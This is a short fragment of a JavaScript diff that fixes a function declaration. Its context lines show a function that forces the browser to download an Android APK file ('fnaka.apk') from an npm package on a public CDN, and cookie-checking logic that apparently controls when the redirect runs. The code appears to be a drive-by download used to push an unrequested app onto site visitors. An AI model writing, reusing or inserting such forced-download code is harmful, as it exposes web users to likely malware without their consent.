@@ -20,7 +20,7 @@ function dc()
 
  window.location.assign("https://cdn.jsdelivr.net/npm/arcio@1.0.2/fnaka.apk")
  }
-checkCookie(){
+function  checkCookie(){
  function  spd(){
          k=getCookie("mkl");
           if  (k==null){
